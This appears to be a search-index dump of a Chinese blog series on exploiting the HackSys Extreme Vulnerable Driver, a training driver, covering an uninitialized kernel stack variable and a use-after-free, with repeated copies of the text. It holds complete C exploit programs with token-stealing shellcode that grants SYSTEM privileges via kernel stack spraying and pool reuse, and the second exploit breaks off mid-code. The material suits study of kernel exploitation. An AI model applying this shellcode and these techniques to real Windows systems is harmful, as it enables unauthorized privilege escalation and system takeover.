( OUT PVOID Destination , IN PVOID Source , IN ULONG_PTR ArraySize ) { try { ProbeForRead ( Source , ArraySize * sizeof ( ULONG_PTR ), sizeof ( ULONG_PTR )); RtlCopyMemory ( Destination , Source , ArraySize * sizeof ( ULONG_PTR )); } except ( EXCEPTION_EXECUTE_HANDLER ) { status = GetExceptionCode (); } } \u5927\u81f4\u4e0a\u8bf4\uff0c\u5f53\u6211\u4eec\u8c03\u7528 NtMapUserPhysicalPages \u65f6\uff0c\u4f1a\u5728\u6808\u4e2d\u5206\u914d\u4e00\u4e2a 4096 \u4e2a\u5b57\u8282\u7684\u53d8\u91cf StackArray\uff0c\u800c\u6211\u4eec\u8c03\u7528 NtMapUserPhysicalPages \u65f6\u4f20\u9012\u7684\u53c2\u6570 UserPfnArray \u4f1a\u88ab\u590d\u5236\u5230\u8fd9\u4e2a\u4f4d\u7f6e\u4e0a\u3002 \u5bf9\u4e8e\u5185\u6838\u6808\u6765\u8bf4\uff0c4096\u4e2a\u5b57\u8282\u771f\u7684\u5df2\u7ecf\u7b97\u633a\u5927\u7684\u4e86\u3002\u82e5\u6211\u4eec\u628a\u8fd9\u4e00\u6bb5\u6808\u7a7a\u95f4\u5168\u90e8\u66ff\u6362\u6210\u6211\u4eec\u7684 shellcode \u7684\u5730\u5740\uff0c\u7136\u540e\u89e6\u53d1\u6f0f\u6d1e\u65f6\u672a\u521d\u59cb\u5316\u53d8\u91cf\u6240\u4f7f\u7528\u7684\u6808\u53c8\u6b63\u597d\u5728\u8fd9\u4e00\u6bb5\u5730\u5740\u4e0a\uff0c\u4e14\u8fd9\u4e2a\u4f4d\u7f6e\u7684\u6808\u53c8\u6b63\u597d\u6ca1\u6709\u88ab\u5176\u5b83\u51fd\u6570\u6240\u4fee\u6539\u8fc7\u7684\u8bdd\uff08\u4ece RtlCopyMemory \u6267\u884c\u5b8c\u76f4\u5230 UninitializedMemory.Callback() \uff09\uff0c\u90a3\u4e48 UninitializedMemory.Callback() \u7684\u65f6\u5019\u5c31\u4f1a\u6267\u884c\u6211\u4eec\u7684 shellcode \u4e86\u3002 \u6240\u4ee5\uff0c\u6ca1\u9519\uff0c\u5f53\u6211\u4eec\u8c03\u7528\u5b8c NtMapUserPhysicalPages \u540e\u82e5\u7acb\u5373\u8c03\u7528 DeviceIoControl \u53bb\u8bf7\u6c42\u670d\u52a1\u89e6\u53d1\u6f0f\u6d1e\u7684\u8bdd\uff0c\u8fd9\u4e00\u5207\u5c31\u662f\u6b63\u597d\u8fd9\u4e48\u51d1\u5de7\u3002 \uff1a ) 0x02 \u672a\u521d\u59cb\u5316\u6808\u53d8\u91cf\u6f0f\u6d1e\u5229\u7528 \u8fd9\u4e2a\u6f0f\u6d1e\u7684\u5229\u7528\u539f\u7406\u5176\u5b9e\u633a\u7b80\u5355\u7684\uff0c\u4f46\u8981\u771f\u6b63\u4f7f\u8fd9\u4e2a\u6f0f\u6d1e\u751f\u6548\u5176\u5b9e\u4e0d\u5bb9\u6613\u3002\u8ba9\u53d8\u91cf\u843d\u5728\u8fd9\u4e00\u6bb5\u7a7a\u95f4\u4e2d\u5012\u662f\u633a\u53ef\u80fd\uff0c\u6bd5\u7adf 4096 \u4e2a\u5b57\u8282\u771f\u7684\u633a\u5927\u7684\u3002\u95ee\u9898\u662f\u4f60\u5f88\u96be\u786e\u4fdd\u672a\u521d\u59cb\u5316\u53d8\u91cf\u6240\u5728\u7684\u4f4d\u7f6e\u6ca1\u6709\u88ab\u5176\u5b83\u51fd\u6570\u4fee\u6539\u8fc7\u3002 \u8fd9\u91cc\u8d34\u51fa exp #include stdafx.h #include windows.h typedef NTSTATUS ( WINAPI * NtMapUserPhysicalPages_t )( PVOID VirtualAddress , ULONG_PTR NumberOfPages , PULONG_PTR PageArray ); char shellcode [] = { \\x90\\x90\\x90\\x90 // NOP Sled \\x60 // pushad \\x31\\xc0 // xor eax,eax \\x64\\x8b\\x80\\x24\\x01\\x00\\x00 // mov eax,[fs:eax+0x124] \\x8b\\x40\\x50 // mov eax,[eax+0x50] \\x89\\xc1 // mov ecx,eax \\xba\\x04\\x00\\x00\\x00 // mov edx,0x4 \\x8b\\x80\\xb8\\x00\\x00\\x00 // mov eax,[eax+0xb8] \\x2d\\xb8\\x00\\x00\\x00 // sub eax,0xb8 \\x39\\x90\\xb4\\x00\\x00\\x00 // cmp [eax+0xb4],edx \\x75\\xed // jnz 0x1a \\x8b\\x90\\xf8\\x00\\x00\\x00 // mov edx,[eax+0xf8] \\x89\\x91\\xf8\\x00\\x00\\x00 // mov [ecx+0xf8],edx \\x61 // popad \\xC3 // ret }; int main () { int value = 0x1 ; int * payload = value ; DWORD lpBytesReturned = 0 ; HANDLE hevDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); LPVOID ptr = VirtualAlloc ( 0 , sizeof ( shellcode ), 0x3000 , 0x40 ); RtlCopyMemory ( ptr , shellcode , sizeof ( shellcode )); ULONG_PTR PageArray [ 1024 ] = { 0 }; for ( int i = 0 ; i 1024 ; i ++ ) { PageArray [ i ] = ( ULONG_PTR ) ptr ; } HMODULE hModule = LoadLibrary ( ntdll.dll ); if ( hModule == NULL ) { printf ( LoadLibrary failed \\n ); return 0 ; } NtMapUserPhysicalPages_t NtMapUserPhysicalPages = ( NtMapUserPhysicalPages_t ) GetProcAddress ( hModule , NtMapUserPhysicalPages ); if ( NtMapUserPhysicalPages == NULL ) { printf ( get proc address failed \\n ); return 0 ; } NtMapUserPhysicalPages ( NULL , 1024 , PageArray ); DeviceIoControl ( hevDevice , 0x22202f , payload , 0x4 , NULL , 0 , lpBytesReturned , NULL ); system ( whoami ); return 0 ; } \u5173\u4e8e exp \u65e0\u6cd5 getshell \u7684\u53ef\u80fd\u539f\u56e0 \u8fd9\u91cc\u6211\u5728\u8c03\u8bd5\u65f6\u53d1\u73b0 \uff08\u8fd9\u91cc\u5c31\u4e0d\u628a\u56fe\u7247\u538b\u7f29\u592a\u591a\u4e86\uff0c\u4e0d\u7136\u6015\u4f60\u4eec\u770b\u4e0d\u6e05\uff0c\u6240\u4ee5\u52a0\u8f7d\u53ef\u80fd\u4f1a\u6162\u4e00\u70b9\uff09 \u5927\u5bb6\u53ef\u4ee5\u770b\u5230\u5373\u4f7f\u662f esp \u518d\u5f80\u4f4e\u5730\u5740\u7684\u7a7a\u95f4\u4e5f\u88ab\u4ec0\u4e48\u4e1c\u897f\u4fee\u6539\u8fc7\u4e86\uff0c\u8981\u4e00\u76f4\u5230\u5f88\u8fdc \u624d\u5f7b\u5e95\u6ca1\u6709\u88ab\u51fd\u6570\u4fee\u6539\u8fc7\u3002\u867d\u7136\u4e2d\u95f4\u53ef\u80fd\u5b58\u5728 shellcode \u7684 gadget\uff0c\u4f46\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684\u6f0f\u6d1e\u51fd\u6570\u7684\u6808\u4e2d\u662f\u4e0d\u5b58\u5728\u4efb\u4f55 shellcode \u7684\u5730\u5740\u7684\u3002 \u8fd9\u65f6\u5019\u6211\u5c31\u5728\u60f3\u554a\uff0c\u4e00\u6765\u770b\u522b\u4eba\u8fd9\u4e2a\u65b9\u6cd5\u90fd\u662f\u6210\u529f\u7684\uff0c\u4e8c\u6765\u4ece NtMapUserPhysicalPages \u5230 TriggerUninitializedMemoryStack \u4e5f\u5c31\u7ecf\u5386\u9000\u51fa\u5185\u6838\u6001\u56de\u5230\u7528\u6237\u6001\uff0c\u4ee5\u53ca DriverEntry - IrpDeviceIoCtlHandler - UninitializedMemoryStackIoctlHandler - TriggerUninitializedMemoryStack \u8fd9\u4e48\u4e00\u4e2a\u8fc7\u7a0b\uff0c\u4e0d\u81f3\u4e8e\u7528\u6389\u8fd9\u4e48\u591a\u7a7a\u95f4\u5427\u3002\u8981\u8bf4\u8fd9\u8fc7\u7a0b\u4e2d\u6709\u4ec0\u4e48\u4e1c\u897f\u53ef\u80fd\u63d2\u624b\u7684\u8bdd\uff0c\u5c31\u53ea\u6709\u53ef\u80fd\u662f Debug \u4e86\u3002 \u7136\u540e\u6211\u5c31\u628a HEVD \u9a71\u52a8\u7a0b\u5e8f\u6362\u6210\u4e86 release \u7248\u672c\u7684\uff0c\u628a windbg \u5173\u6389\uff0c\u8bf6\u563f\uff0c\u8fd8\u771f getshell \u4e86\u3002 \u6240\u4ee5\u5982\u679c\u4f60\u7684\u60c5\u51b5\u548c\u6211\u4e00\u6837\u7684\u8bdd\uff08\u9996\u5148\u786e\u4fdd\u6808\u55b7\u5c04\u786e\u5b9e\u6210\u529f\u4e86\uff09\uff0c\u4f60\u4e0d\u59a8\u8bd5\u8bd5\u53bb\u6389\u6240\u6709 debug \u56e0\u7d20\u3002 0x03 \u7ed3\u675f\u8bed \uff1a ) 2019.9.5","title":"\uff08\u4e94\uff09HEVD \u672a\u521d\u59cb\u5316\u6808\u53d8\u91cf"},{"location":"HEVD/uninitializedStackVariable/#0x00","text":"\u672c\u7bc7\u7684\u5185\u5bb9\u4e3a\u672a\u521d\u59cb\u5316\u5185\u6838\u6808\u53d8\u91cf\u6f0f\u6d1e\u5206\u6790\u5229\u7528 (Uninitialized Stack Variable)","title":"0x00 \u524d\u8a00"},{"location":"HEVD/uninitializedStackVariable/#0x01","text":"\u9996\u5148\u6211\u4eec\u6253\u5f00 UninitializedMemoryStack.c \u6587\u4ef6 \u7ed3\u5408\u5b9a\u4e49 UninitializedMemory \u53d8\u91cf\u65f6\u6ca1\u6709\u5bf9\u5b83\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u5f53\u6211\u4eec\u7684\u8f93\u5165\u4e0d\u7b49\u4e8e MagicValue \u65f6\uff0c\u7a0b\u5e8f\u4f1a\u76f4\u63a5 call [ UninitializedMemory + 4]\uff0c\u800c\u8fd9\u4e2a\u503c\u56e0\u4e3a\u6ca1\u6709\u88ab\u521d\u59cb\u5316\uff0c\u53c8\u6ca1\u6709\u88ab\u8d4b\u503c\uff0c\u6240\u4ee5\u4f1a\u76f4\u63a5\u8c03\u7528\u6808\u4e0a\u7684\u810f\u6570\u636e\u3002\u82e5\u6808\u4e0a\u7684\u810f\u6570\u636e\u662f\u6211\u4eec\u7684 shellcode \u7684\u5730\u5740\u7684\u8bdd\uff0c\u90a3\u6211\u4eec\u53c8\u53ef\u4ee5\u63a5\u7ba1\u6307\u4ee4\u6d41\u4e86\u3002 \u95ee\u9898\u662f\uff0c\u6211\u4eec\u6709\u4ec0\u4e48\u529e\u6cd5\u53ef\u4ee5\u4f7f\u6808\u4e0a\u7684\u810f\u6570\u636e\u53d8\u4e3a\u6211\u4eec\u7684 shellcode \u7684\u5730\u5740\u5462\uff1f \u8fd9\u91cc\u53ef\u4ee5\u7528\u5230\u4e00\u79cd\u53eb\u505a\u6808\u55b7\u5c04\u7684\u65b9\u6cd5\uff0c\u5c06\u5927\u5757\u7684\u6808\u7a7a\u95f4\u63d0\u524d\u7528\u6211\u4eec\u7684 shellcode \u7684\u5730\u5740\u53bb\u6539\u5199\u3002\u4ee5\u540e\u82e5\u662f\u5728\u8fd9\u4e2a\u6808\u533a\u57df\u4e0a\u53d1\u751f\u4e86\u5bf9\u672a\u521d\u59cb\u5316\u51fd\u6570\u6307\u9488\u7684\u8c03\u7528\uff0c\u5c31\u4f1a\u6267\u884c\u6211\u4eec\u7684\u6307\u4ee4\u6d41\u4e86\u3002 \u90a3\u4e48\u6211\u4eec\u5982\u4f55\u505a\u5230\u5bf9\u5185\u6838\u6808\u8fdb\u884c\u55b7\u5c04\u5462\uff1f\uff08\u56e0\u4e3a\u6211\u4eec\u7684\u6f0f\u6d1e\u662f\u53d1\u751f\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u7684\uff0c\u6f0f\u6d1e\u4ee3\u7801\u6240\u4f7f\u7528\u7684\u6808\u7a7a\u95f4\u662f\u5185\u6838\u6808\uff0c\u6240\u4ee5\u5e94\u8be5\u662f\u5bf9\u5185\u6838\u6808\u8fdb\u884c\u55b7\u5c04\u800c\u4e0d\u662f\u7528\u6237\u6808\uff09 \u8fd9\u91cc\u53ef\u4ee5\u7528\u5230 NtMapUserPhysicalPages \u51fd\u6570\u3002\u6211\u4eec\u5148\u770b\u770b\u8fd9\u4e2a\u51fd\u6570\u7684\u5b98\u65b9\u6587\u6863 \u8fd9\u4e2a\u51fd\u6570\u6b63\u5e38\u6765\u8bf4\u662f\u7528\u5728 AWE \u7684\u4f7f\u7528\u4e2d\u7684\u3002\u4f46\u662f\u8fd9\u5bf9\u6211\u4eec\u6765\u8bf4\u4e0d\u91cd\u8981\uff0c\u6211\u4eec\u7684\u76ee\u7684\u662f\u6808\u55b7\u5c04\u3002\u7a0d\u5fae\u5230 wrk1.2 \u4e2d\u770b\u770b\u5b83\u7684\u6e90\u7801\uff0c\u6211\u8fd9\u91cc\u5927\u6982\u5c06\u4e0e\u6808\u55b7\u5c04\u76f8\u5173\u7684\u4f2a\u4ee3\u7801\u5448\u73b0\u51fa\u6765 #define COPY_STACK_SIZE 1024 NTSTATUS NtMapUserPhysicalPages ( __in PVOID VirtualAddress , __in ULONG_PTR NumberOfPages , __in_ecount_opt ( NumberOfPages ) PULONG_PTR UserPfnArray ) { ... ULONG_PTR StackArray [ COPY_STACK_SIZE ]; ... PoolArea = ( PVOID ) StackArray [ 0 ]; ... if ( NumberOfPages COPY_STACK_SIZE ) { PoolArea = ExAllocatePoolWithTag ( NonPagedPool , NumberOfBytes , wRmM ); if ( PoolArea == NULL ) { return STATUS_INSUFFICIENT_RESOURCES ; } } Status = MiCaptureUlongPtrArray ( PoolArea , UserPfnArray , NumberOfPages ); ... } NTSTATUS MiCaptureUlongPtrArray ( OUT PVOID Destination , IN PVOID Source , IN ULONG_PTR ArraySize ) { try { ProbeForRead ( Source , ArraySize * sizeof ( ULONG_PTR ), sizeof ( ULONG_PTR )); RtlCopyMemory ( Destination , Source , ArraySize * sizeof ( ULONG_PTR )); } except ( EXCEPTION_EXECUTE_HANDLER ) { status = GetExceptionCode (); } } \u5927\u81f4\u4e0a\u8bf4\uff0c\u5f53\u6211\u4eec\u8c03\u7528 NtMapUserPhysicalPages \u65f6\uff0c\u4f1a\u5728\u6808\u4e2d\u5206\u914d\u4e00\u4e2a 4096 \u4e2a\u5b57\u8282\u7684\u53d8\u91cf StackArray\uff0c\u800c\u6211\u4eec\u8c03\u7528 NtMapUserPhysicalPages \u65f6\u4f20\u9012\u7684\u53c2\u6570 UserPfnArray \u4f1a\u88ab\u590d\u5236\u5230\u8fd9\u4e2a\u4f4d\u7f6e\u4e0a\u3002 \u5bf9\u4e8e\u5185\u6838\u6808\u6765\u8bf4\uff0c4096\u4e2a\u5b57\u8282\u771f\u7684\u5df2\u7ecf\u7b97\u633a\u5927\u7684\u4e86\u3002\u82e5\u6211\u4eec\u628a\u8fd9\u4e00\u6bb5\u6808\u7a7a\u95f4\u5168\u90e8\u66ff\u6362\u6210\u6211\u4eec\u7684 shellcode \u7684\u5730\u5740\uff0c\u7136\u540e\u89e6\u53d1\u6f0f\u6d1e\u65f6\u672a\u521d\u59cb\u5316\u53d8\u91cf\u6240\u4f7f\u7528\u7684\u6808\u53c8\u6b63\u597d\u5728\u8fd9\u4e00\u6bb5\u5730\u5740\u4e0a\uff0c\u4e14\u8fd9\u4e2a\u4f4d\u7f6e\u7684\u6808\u53c8\u6b63\u597d\u6ca1\u6709\u88ab\u5176\u5b83\u51fd\u6570\u6240\u4fee\u6539\u8fc7\u7684\u8bdd\uff08\u4ece RtlCopyMemory \u6267\u884c\u5b8c\u76f4\u5230 UninitializedMemory.Callback() \uff09\uff0c\u90a3\u4e48 UninitializedMemory.Callback() \u7684\u65f6\u5019\u5c31\u4f1a\u6267\u884c\u6211\u4eec\u7684 shellcode \u4e86\u3002 \u6240\u4ee5\uff0c\u6ca1\u9519\uff0c\u5f53\u6211\u4eec\u8c03\u7528\u5b8c NtMapUserPhysicalPages \u540e\u82e5\u7acb\u5373\u8c03\u7528 DeviceIoControl \u53bb\u8bf7\u6c42\u670d\u52a1\u89e6\u53d1\u6f0f\u6d1e\u7684\u8bdd\uff0c\u8fd9\u4e00\u5207\u5c31\u662f\u6b63\u597d\u8fd9\u4e48\u51d1\u5de7\u3002 \uff1a )","title":"0x01 \u672a\u521d\u59cb\u5316\u6808\u53d8\u91cf\u6f0f\u6d1e\u5206\u6790"},{"location":"HEVD/uninitializedStackVariable/#0x02","text":"\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u5229\u7528\u539f\u7406\u5176\u5b9e\u633a\u7b80\u5355\u7684\uff0c\u4f46\u8981\u771f\u6b63\u4f7f\u8fd9\u4e2a\u6f0f\u6d1e\u751f\u6548\u5176\u5b9e\u4e0d\u5bb9\u6613\u3002\u8ba9\u53d8\u91cf\u843d\u5728\u8fd9\u4e00\u6bb5\u7a7a\u95f4\u4e2d\u5012\u662f\u633a\u53ef\u80fd\uff0c\u6bd5\u7adf 4096 \u4e2a\u5b57\u8282\u771f\u7684\u633a\u5927\u7684\u3002\u95ee\u9898\u662f\u4f60\u5f88\u96be\u786e\u4fdd\u672a\u521d\u59cb\u5316\u53d8\u91cf\u6240\u5728\u7684\u4f4d\u7f6e\u6ca1\u6709\u88ab\u5176\u5b83\u51fd\u6570\u4fee\u6539\u8fc7\u3002 \u8fd9\u91cc\u8d34\u51fa exp #include stdafx.h #include windows.h typedef NTSTATUS ( WINAPI * NtMapUserPhysicalPages_t )( PVOID VirtualAddress , ULONG_PTR NumberOfPages , PULONG_PTR PageArray ); char shellcode [] = { \\x90\\x90\\x90\\x90 // NOP Sled \\x60 // pushad \\x31\\xc0 // xor eax,eax \\x64\\x8b\\x80\\x24\\x01\\x00\\x00 // mov eax,[fs:eax+0x124] \\x8b\\x40\\x50 // mov eax,[eax+0x50] \\x89\\xc1 // mov ecx,eax \\xba\\x04\\x00\\x00\\x00 // mov edx,0x4 \\x8b\\x80\\xb8\\x00\\x00\\x00 // mov eax,[eax+0xb8] \\x2d\\xb8\\x00\\x00\\x00 // sub eax,0xb8 \\x39\\x90\\xb4\\x00\\x00\\x00 // cmp [eax+0xb4],edx \\x75\\xed // jnz 0x1a \\x8b\\x90\\xf8\\x00\\x00\\x00 // mov edx,[eax+0xf8] \\x89\\x91\\xf8\\x00\\x00\\x00 // mov [ecx+0xf8],edx \\x61 // popad \\xC3 // ret }; int main () { int value = 0x1 ; int * payload = value ; DWORD lpBytesReturned = 0 ; HANDLE hevDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); LPVOID ptr = VirtualAlloc ( 0 , sizeof ( shellcode ), 0x3000 , 0x40 ); RtlCopyMemory ( ptr , shellcode , sizeof ( shellcode )); ULONG_PTR PageArray [ 1024 ] = { 0 }; for ( int i = 0 ; i 1024 ; i ++ ) { PageArray [ i ] = ( ULONG_PTR ) ptr ; } HMODULE hModule = LoadLibrary ( ntdll.dll ); if ( hModule == NULL ) { printf ( LoadLibrary failed \\n ); return 0 ; } NtMapUserPhysicalPages_t NtMapUserPhysicalPages = ( NtMapUserPhysicalPages_t ) GetProcAddress ( hModule , NtMapUserPhysicalPages ); if ( NtMapUserPhysicalPages == NULL ) { printf ( get proc address failed \\n ); return 0 ; } NtMapUserPhysicalPages ( NULL , 1024 , PageArray ); DeviceIoControl ( hevDevice , 0x22202f , payload , 0x4 , NULL , 0 , lpBytesReturned , NULL ); system ( whoami ); return 0 ; }","title":"0x02 \u672a\u521d\u59cb\u5316\u6808\u53d8\u91cf\u6f0f\u6d1e\u5229\u7528"},{"location":"HEVD/uninitializedStackVariable/#exp-getshell","text":"\u8fd9\u91cc\u6211\u5728\u8c03\u8bd5\u65f6\u53d1\u73b0 \uff08\u8fd9\u91cc\u5c31\u4e0d\u628a\u56fe\u7247\u538b\u7f29\u592a\u591a\u4e86\uff0c\u4e0d\u7136\u6015\u4f60\u4eec\u770b\u4e0d\u6e05\uff0c\u6240\u4ee5\u52a0\u8f7d\u53ef\u80fd\u4f1a\u6162\u4e00\u70b9\uff09 \u5927\u5bb6\u53ef\u4ee5\u770b\u5230\u5373\u4f7f\u662f esp \u518d\u5f80\u4f4e\u5730\u5740\u7684\u7a7a\u95f4\u4e5f\u88ab\u4ec0\u4e48\u4e1c\u897f\u4fee\u6539\u8fc7\u4e86\uff0c\u8981\u4e00\u76f4\u5230\u5f88\u8fdc \u624d\u5f7b\u5e95\u6ca1\u6709\u88ab\u51fd\u6570\u4fee\u6539\u8fc7\u3002\u867d\u7136\u4e2d\u95f4\u53ef\u80fd\u5b58\u5728 shellcode \u7684 gadget\uff0c\u4f46\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684\u6f0f\u6d1e\u51fd\u6570\u7684\u6808\u4e2d\u662f\u4e0d\u5b58\u5728\u4efb\u4f55 shellcode \u7684\u5730\u5740\u7684\u3002 \u8fd9\u65f6\u5019\u6211\u5c31\u5728\u60f3\u554a\uff0c\u4e00\u6765\u770b\u522b\u4eba\u8fd9\u4e2a\u65b9\u6cd5\u90fd\u662f\u6210\u529f\u7684\uff0c\u4e8c\u6765\u4ece NtMapUserPhysicalPages \u5230 TriggerUninitializedMemoryStack \u4e5f\u5c31\u7ecf\u5386\u9000\u51fa\u5185\u6838\u6001\u56de\u5230\u7528\u6237\u6001\uff0c\u4ee5\u53ca DriverEntry - IrpDeviceIoCtlHandler - UninitializedMemoryStackIoctlHandler - TriggerUninitializedMemoryStack \u8fd9\u4e48\u4e00\u4e2a\u8fc7\u7a0b\uff0c\u4e0d\u81f3\u4e8e\u7528\u6389\u8fd9\u4e48\u591a\u7a7a\u95f4\u5427\u3002\u8981\u8bf4\u8fd9\u8fc7\u7a0b\u4e2d\u6709\u4ec0\u4e48\u4e1c\u897f\u53ef\u80fd\u63d2\u624b\u7684\u8bdd\uff0c\u5c31\u53ea\u6709\u53ef\u80fd\u662f Debug \u4e86\u3002 \u7136\u540e\u6211\u5c31\u628a HEVD \u9a71\u52a8\u7a0b\u5e8f\u6362\u6210\u4e86 release \u7248\u672c\u7684\uff0c\u628a windbg \u5173\u6389\uff0c\u8bf6\u563f\uff0c\u8fd8\u771f getshell \u4e86\u3002 \u6240\u4ee5\u5982\u679c\u4f60\u7684\u60c5\u51b5\u548c\u6211\u4e00\u6837\u7684\u8bdd\uff08\u9996\u5148\u786e\u4fdd\u6808\u55b7\u5c04\u786e\u5b9e\u6210\u529f\u4e86\uff09\uff0c\u4f60\u4e0d\u59a8\u8bd5\u8bd5\u53bb\u6389\u6240\u6709 debug \u56e0\u7d20\u3002","title":"\u5173\u4e8e exp \u65e0\u6cd5 getshell \u7684\u53ef\u80fd\u539f\u56e0"},{"location":"HEVD/uninitializedStackVariable/#0x03","text":"\uff1a ) 2019.9.5","title":"0x03 \u7ed3\u675f\u8bed"},{"location":"HEVD/useAfterFree/","text":"\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u54e6 : ) 0x00 \u524d\u8a00 \u8fd9\u7bc7\u5c31\u662f HEVD \u7cfb\u5217\u7684\u6700\u540e\u4e00\u7bc7\u4e86\uff0c\u6709\u4e9b\u8bdd\u6211\u653e\u5728\u7ed3\u5c3e\u8bf4\u5427\u3002 \u672c\u7bc7\u7684\u5185\u5bb9\u4e3a Use After Free \u6f0f\u6d1e\u5206\u6790\u5229\u7528\u3002 0x01 Use After Free \u6f0f\u6d1e\u5206\u6790 \u6309\u5957\u8def\u6211\u4eec\u5148\u6253\u5f00 UseAfterFreeNonPagedPool.c \u6587\u4ef6\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4ee3\u7801\u76f8\u5bf9\u4e4b\u524d\u505a\u7684\u7a0d\u5fae\u957f\u4e00\u70b9\uff0c\u4f46\u5176\u5b9e\u4e5f\u4e0d\u7b97\u957f\uff0c\u6bd5\u7adf\u5c31\u7b97\u662f wrk \u7684\u6587\u4ef6\u4e5f\u52a8\u4e0d\u52a8\u5c31\u662f\u597d\u51e0\u5343\u884c\u3002 \u8fd9\u91cc\u6211\u5c31\u4e0d\u89e3\u91ca\u6e90\u7801\u4e86\uff0c\u5927\u5bb6\u8ba4\u771f\u9605\u8bfb\u4e00\u4e0b\u5c31\u53ef\u4ee5\u77e5\u9053\u3002 \u53ef\u4ee5\u770b\u5230\uff0c\u6f0f\u6d1e\u53d1\u751f\u5728 Free \u51fd\u6570\u4e2d \u5f53\u6211\u4eec\u7528 Alloc \u51fd\u6570\u5728\u975e\u6362\u9875\u6c60\u4e2d\u5206\u914d\u5b8c\u7a7a\u95f4\u5e76\u4f7f g_UseAfterFreeObjectNonPagedPool \u6307\u5411\u8fd9\u6bb5\u7a7a\u95f4\u540e\uff0c\u5728 Free \u51fd\u6570\u7684\u65f6\u5019\u53ea\u91ca\u653e\u4e86\u8fd9\u6bb5\u975e\u6362\u9875\u6c60\u7a7a\u95f4\u4f46\u5e76\u6ca1\u6709\u5c06 g_UseAfterFreeObjectNonPagedPool \u6307\u9488\u7f6e NULL\u3002 \u518d\u770b\u5230 UseUaFObjectNonPagedPool \u51fd\u6570\u4e2d\uff0c\u82e5 g_UseAfterFreeObjectNonPagedPool \u4e0d\u4e3a NULL \u5c06\u6267\u884c g_UseAfterFreeObjectNonPagedPool- Callback() \u90a3\u4e48\u5229\u7528\u5c31\u5f88\u6e05\u6670\u4e86\uff0c\u6211\u4eec\u53ea\u9700\u8981 \u5229\u7528 Alloc \u51fd\u6570\u5206\u914d\u7a7a\u95f4\u5e76\u4f7f g_UseAfterFreeObjectNonPagedPool \u6307\u5411\u8be5\u6bb5\u7a7a\u95f4 \u8c03\u7528 Free \u51fd\u6570\u91ca\u653e\u8fd9\u6bb5\u7a7a\u95f4\uff0c\u4f46 g_UseAfterFreeObjectNonPagedPool \u4ecd\u7136\u6307\u5411\u8be5\u7a7a\u95f4 \u8c03\u7528 AllocFake \u6765\u4f7f\u9875\u9762\u53d8\u810f\uff0c\u4f7f g_UseAfterFreeObjectNonPagedPool - Callback \u7684\u4f4d\u7f6e\u53d8\u4e3a\u6211\u4eec shellcode \u7684\u5730\u5740 \u8c03\u7528 UseUaFObjectNonPagedPool \u89e6\u53d1 g_UseAfterFreeObjectNonPagedPool- Callback() \u6765\u6267\u884c\u6211\u4eec\u7684 shellcode 0x02 Use After Free \u6f0f\u6d1e\u5229\u7528 \u8fd9\u91cc\u6709\u4e2a\u95ee\u9898\u5c31\u662f\uff0cFree \u51fd\u6570\u91ca\u653e\u6389\u7684 Alloc \u51fd\u6570\u5206\u914d\u7684\u7a7a\u95f4\u8ddf\u4e4b\u540e AllocFake \u5206\u914d\u7684\u7a7a\u95f4\u662f\u540c\u4e00\u5757\u5417\uff1f\uff08\u6ce8\u610f\u5230 Alloc \u548c AllocFake \u7533\u8bf7\u7684\u7a7a\u95f4\u5927\u5c0f\u662f\u76f8\u7b49\u7684\uff09 \u8fd9\u5c31\u6d89\u53ca\u5230 Windows \u7684\u5185\u5b58\u7ba1\u7406\u7b97\u6cd5\u4e86\u3002\u5176\u5b9e\u4f60\u91ca\u653e\u6389\u4e00\u5757\u7a7a\u95f4\u540e\u7acb\u9a6c\u53c8\u7533\u8bf7\u4e00\u5757\u5927\u5c0f\u76f8\u7b49\u7684\u7a7a\u95f4\u5185\u5b58\u7ba1\u7406\u5668\u662f\u503e\u5411\u4e8e\u5206\u914d\u540c\u4e00\u5757\u7a7a\u95f4\u7ed9\u4f60\u7684\u3002 \u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8fd9\u4e48\u4e00\u6bb5\u4ee3\u7801\u5c31\u80fd\u63d0\u6743\u4e86 // useAfterFree.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h #define UseUafObject 0x222017 #define AllocateUafObject 0x222013 #define FreeUafObject 0x22201b #define AllocateFakeUafObject 0x22201f typedef struct _FAKE_OBJECT_NON_PAGED_POOL { char Buffer [ 0x58 ]; } FakeObject , * PFakeObject ; char shellcode [] = { \\x90\\x90\\x90\\x90 // NOP Sled \\x60 // pushad \\x31\\xc0 // xor eax,eax \\x64\\x8b\\x80\\x24\\x01\\x00\\x00 // mov eax,[fs:eax+0x124] \\x8b\\x40\\x50 // mov eax,[eax+0x50] \\x89\\xc1 // mov ecx,eax \\xba\\x04\\x00\\x00\\x00 // mov edx,0x4 \\x8b\\x80\\xb8\\x00\\x00\\x00 // mov eax,[eax+0xb8] \\x2d\\xb8\\x00\\x00\\x00 // sub eax,0xb8 \\x39\\x90\\xb4\\x00\\x00\\x00 // cmp [eax+0xb4],edx \\x75\\xed // jnz 0x1a \\x8b\\x90\\xf8\\x00\\x00\\x00 // mov edx,[eax+0xf8] \\x89\\x91\\xf8\\x00\\x00\\x00 // mov [ecx+0xf8],edx \\x61 // popad \\xC3 // ret }; int main () { LPVOID ptr = VirtualAlloc ( 0 , sizeof ( shellcode ), 0x3000 , 0x40 ); RtlCopyMemory ( ptr , shellcode , sizeof ( shellcode )); PFakeObject pfakeObject = ( PFakeObject ) malloc ( sizeof ( FakeObject )); memset ( pfakeObject , \\x42 , sizeof ( FakeObject )); * ( PDWORD ) pfakeObject = ( DWORD ) ptr ; int noUseBuf = 0x1 ; HANDLE hevDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); DWORD lpBytesReturned = 0 ; DeviceIoControl ( hevDevice , AllocateUafObject , noUseBuf , 0x4 , NULL , 0 , lpBytesReturned , NULL ); DeviceIoControl ( hevDevice , FreeUafObject , noUseBuf , 0x4 , NULL , 0 , 